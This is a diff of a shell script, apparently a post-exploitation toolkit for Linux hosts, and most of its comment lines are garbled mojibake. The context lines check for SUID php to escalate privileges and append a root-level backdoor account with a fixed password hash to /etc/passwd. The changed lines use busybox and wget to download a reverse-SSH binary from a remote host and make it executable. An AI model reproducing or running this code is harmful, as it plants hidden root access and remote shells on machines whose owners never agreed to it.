@@ -79,7 +79,7 @@ d0="/bin/sh"
 (which ash) && d0=$(which ash)
 (which bash) && d0=$(which bash)
 
-# [ -u FILE ] ?|???? FILE ?-???¡§??¡±¨¨??????o?SUID (set user ID)?????o????€?
+# [ -u FILE ] ?|???? FILE ?-???Â¨??â€Ã¨??????o?SUID (set user ID)?????o????â‚¬?
 
 # php with suid
 (which php) &&
@@ -163,7 +163,7 @@ echo 7749;
                 cp /etc/passwd /etc/passwd.bak
                 echo "tee:\$1\$123456\$wOSEtcyiP2N/IfIl15W6Z0:0:0:toor:/tmp:/bin/bash" >>/etc/passwd
             )
-        #sh -c "${ssh_1001}"# ??¡ä?¡ª?????¡±¡§??€??¡¥1001??¡¥??¡ê
+        #sh -c "${ssh_1001}"# ??â€²?â€”?????â€Â¨??â‚¬??Ë‰1001??Ë‰??ï¿¡
     )
     
 )
@@ -210,8 +210,8 @@ d1="sh -il"
 
 
 ./busybox setsid sh -c "( [ -f /tmp/upx_reverse-sshx64.bin ]&&chmod 0777  /tmp/upx_reverse-sshx64.bin&&exit 0;
- [ -x ./wget ] && ./wget --no-check-certificate "${rr1}upx_reverse-sshx64.bin.001" &&./wget --no-check-certificate "${rr1}upx_reverse-sshx64.bin.002"&&cat upx_reverse-sshx64.bin.00? > upx_reverse-sshx64.bin&&chmod 0777 ./upx_reverse-sshx64.bin
-)"&
+ [ -x ./wget ] && ./wget --no-check-certificate "${rr1}upx_reverse-sshx64.bin" &&chmod 0777 ./upx_reverse-sshx64.bin )"&
+
 
 
 
